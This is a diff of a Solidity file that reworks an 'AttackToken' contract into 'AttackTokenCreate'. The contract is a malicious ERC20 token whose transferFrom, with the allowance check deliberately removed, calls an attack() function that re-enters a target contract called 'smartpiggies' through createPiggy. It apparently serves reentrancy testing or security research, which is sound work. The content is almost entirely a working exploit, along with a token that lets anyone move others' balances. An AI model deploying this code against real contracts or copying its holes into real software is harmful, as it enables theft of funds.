@@ -134,9 +134,9 @@ contract ERC20 is IERC20 {
      * no way affects any of the arithmetic of the contract, including
      * {IERC20-balanceOf} and {IERC20-transfer}.
      */
-    //function decimals() public view returns (uint8) {
-    //    return _decimals;
-    //}
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
 
     /**
      * @dev See {IERC20-totalSupply}.
@@ -196,11 +196,11 @@ contract ERC20 is IERC20 {
      * - the caller must have allowance for ``sender``'s tokens of at least
      * `amount`.
      */
-    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
-        _transfer(sender, recipient, amount);
-       // _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
-        return true;
-    }
+    //function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+    //    _transfer(sender, recipient, amount);
+    //   // _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
+    //    return true;
+    //}
 
     function mint(address receiver, uint256 amount)
       public
@@ -358,12 +358,12 @@ contract ERC20 is IERC20 {
 }
 
 
-contract AttackToken is ERC20 {
+contract AttackTokenCreate is ERC20 {
   uint256 public count;
   address public smartpiggies;
   uint256 public strike = 10000;
   bool public didAttack;
-  bytes public returnData;
+  bytes public returnData = '0';
   string public returnString;
 
   constructor()
@@ -376,46 +376,26 @@ contract AttackToken is ERC20 {
   function()
     external
   {
-    /**
-    //address(smartpiggies).call{gas: 10000000}(
-    address(smartpiggies).call.gas(10000000)(
-      abi.encodeWithSignature(
-        "createPiggy(address,address,address,uint256,uint256,uint256,uint256,bool,bool,bool)",
-        address(this),
-        address(this),
-        address(0),
-        100,
-        1,
-        strike++,
-        100,
-        false,
-        false,
-        false
-      )
-    );
-    count++;
-    **/
+
   }
 
-  function decimals() public returns (uint8) {
-    count++;
-    if (count < 3)
-        attack();
-    return _decimals;
+  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+    attack();
+    _transfer(sender, recipient, amount);
+    // remove allowance check
+    return true;
   }
-
-  //function decimals() public returns (uint8) {
-    //return _decimals;
-  //}
 
   function attack()
     public
   {
-    bytes memory payload = abi.encodeWithSignature("createPiggy(address,address,address,uint256,uint256,uint256,uint256,bool,bool,bool)",address(this),address(this),address(0),100,1,12300,100,false,false,false);
-   (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
-    returnData = data;
-    returnString = string(data);
-    didAttack = success;
+    if (count++ < 2) {
+      bytes memory payload = abi.encodeWithSignature("createPiggy(address,address,address,uint256,uint256,uint256,uint256,bool,bool,bool)",address(this),address(this),address(0),100,1,12300,100,false,false,false);
+      (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
+      returnData = data;
+      returnString = string(data);
+      didAttack = success;
+    }
   }
 
   function setAddress(address _smartpiggies)
